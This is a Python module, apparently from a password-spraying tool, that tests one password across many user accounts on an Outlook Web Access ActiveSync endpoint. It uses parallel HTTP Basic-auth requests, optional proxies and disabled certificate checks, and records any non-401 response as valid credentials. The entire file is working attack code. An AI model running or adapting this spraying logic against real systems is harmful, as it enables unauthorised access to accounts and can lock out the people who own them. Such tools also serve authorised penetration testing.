#!/usr/bin/env python3

import json
import time
import logging
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from functools import partial
from core.utils import *
from core.colors import text_colors
from core.defaults import *
from requests.auth import HTTPBasicAuth

class OmniModule(object):

    # Counter for successful results of each task
    successful_results = 0

    def __init__(self, *args, **kwargs):
        self.type     = "spray"
        self.args     = kwargs['args']
        self.loop     = kwargs['loop']
        self.out_dir  = kwargs['out_dir']
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        self.proxies  = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        # Globally track users being sprayed so we can remove users
        # as needed
        self.users = []
        # Open file handles for writing test/success cases
        self.tested_file  = ThreadWriter(SPRAY_TESTED, self.out_dir)
        self.success_file = ThreadWriter(SPRAY_FILE, self.out_dir)

    def shutdown(self, key=False):
        ''' Perform a shutdown and clean up of the asynchronous handler '''
        print()  # Print empty line
        if key:
            logging.warning("CTRL-C caught...")
        logging.info(f"Results can be found in: '{self.out_dir}'")

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Let the user know the number of valid credentials identified
        logging.info(f"Valid credentials: {self.successful_results}")

        # Close the open file handles
        self.tested_file.close()
        self.success_file.close()

    async def run(self, password):
        ''' Asyncronously execute task(s) '''
        blocking_tasks = [
            self.loop.run_in_executor(
                self.executor, partial(self._execute,
                                       user=user,
                                       password=password)
            )
            for user in self.users
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)

    def prechecks(self):
        ''' Perform module prechecks to validate certain data is set
            via command line args. '''
        if not self.args.domain:
            logging.error("Missing module arguments: -d/--domain")
            return False

        # If --url not provided, check if --proxy-url was provided
        if not self.args.url and not self.args.proxy_url:
            logging.error("Missing module arguments: --url")
            return False

        return True

    def _execute(self, user, password):
        ''' Perform an asynchronous task '''
        try:
            # Task jitter
            self.args.pause()

            # --------------------------------------------------------
            # For new modules, modify the below code block logic

            ''' Spray users on OWA using ActiveSync
                https://github.com/fugawi/EASSniper
                https://github.com/fugawi/EASSniper/blob/master/EASSniper.ps1#L186 '''

            # Write the tested user in its original format with the password
            # via: user:password
            self.tested_file.write(f"{user}:{password}")

            # Transform user -> DOMAIN\user
            user = user.split('@')[0]  # Remove email portion if present
            user = f"{self.args.domain}\\{user}"  # Add domain

            # Build user:password var for reuse with spacing
            creds = f"{user}:{password}"

            # Build custom headers in case we need to handle --proxy-headers
            custom_headers = HTTP_HEADERS

            # Handle the --proxy-url flag
            if self.args.proxy_url:
                url = self.args.proxy_url

                if self.args.proxy_headers:
                    for header in self.args.proxy_headers:
                        header = header.split(':')
                        custom_headers[header[0].strip()] = ':'.join(header[1:]).strip()

            else:
                url  = self.args.url

            # Ensure the URL provided by the user includes the required path
            if "/Microsoft-Server-ActiveSync" not in url:
                url  = url.rstrip('/') + "/Microsoft-Server-ActiveSync"

            auth     = HTTPBasicAuth(user, password)
            response = self._send_request(requests.get,
                                          url,
                                          auth=auth,
                                          headers=custom_headers)

            # Based on testing, 500 and 505 appear to be valid credential response
            # codes. So, for the time being, accept any non-401 response code as
            # valid and display the code to the user.
            r_status = response.status_code
            if r_status != 401:
                self.successful_results += 1
                self.success_file.write(creds)
                logging.info(f"{text_colors.green}[ + ]{text_colors.reset}[{r_status}] {user}:{password}")
                self.users.remove(user)

            else:
                print(f"{text_colors.red}[ - ]{text_colors.reset} {user}:{password}{gen_space(creds)}", end='\r')

            # End template module code block logic.
            # --------------------------------------------------------

        except Exception as e:
            logging.debug(e)
            pass

    def _send_request(self, request, url, auth=None, data=None, json=None,
                      headers=HTTP_HEADERS, allow_redirects=False):
        ''' Template for HTTP Requests '''
        return request(url,
                       auth=auth,
                       data=data,
                       json=json,
                       headers=headers,
                       proxies=self.proxies,
                       timeout=self.args.timeout,
                       allow_redirects=allow_redirects,
                       verify=False)
